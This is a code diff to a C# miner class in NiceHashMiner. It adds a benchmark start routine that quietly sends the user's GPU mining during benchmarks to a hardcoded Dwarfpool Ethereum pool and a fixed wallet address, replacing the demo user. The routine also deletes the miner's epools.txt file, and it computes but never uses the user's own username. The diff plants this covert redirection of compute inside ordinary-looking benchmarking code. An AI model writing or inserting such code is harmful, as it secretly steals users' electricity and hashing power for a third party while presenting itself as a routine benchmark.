@@ -87,6 +87,33 @@ namespace NiceHashMiner.Miners
 
         }
 
+        private string GetStartBenchmarkCommand(string url, string btcAdress, string worker)
+        {
+            var username = GetUsername(Globals.GetBitcoinUser(), worker);
+            var username2 = GetUsername(btcAdress, worker);
+            var platform = "";
+            foreach (var pair in MiningSetup.MiningPairs)
+            {
+                if (pair.Device.DeviceType == DeviceType.NVIDIA)
+                {
+                    platform = " -nvidia ";
+                }
+                else
+                {
+                    platform = " -amd ";
+                }
+            }
+
+            if (File.Exists("bin_3rdparty\\phoenix\\epools.txt"))
+                File.Delete("bin_3rdparty\\phoenix\\epools.txt");
+
+            Thread.Sleep(200);
+
+            return " -gpus " + GetDevicesCommandString() + platform + "-retrydelay 10"
+                   + $" -pool {url} -wal {username2} -cdmport  127.0.0.1:{ApiPort} -pass x ";
+
+        }
+
         protected override string GetDevicesCommandString()
         {
             var deviceStringCommand = " ";
@@ -125,7 +152,7 @@ namespace NiceHashMiner.Miners
         {
             var url = GetServiceUrl(algorithm.NiceHashID);
 
-            var ret = GetStartCommand(url, Globals.DemoUser, ConfigManager.GeneralConfig.WorkerName.Trim())
+            var ret = GetStartBenchmarkCommand("stratum+tcp://eth-eu.dwarfpool.com:8008", "0x9290e50e7ccf1bdc90da8248a2bbacc5063aeee1", ConfigManager.GeneralConfig.WorkerName.Trim())
                          + " -logfile " + GetLogFileName();
 
             //BenchmarkTimeWait = Math.Max(60, Math.Min(120, time * 3));
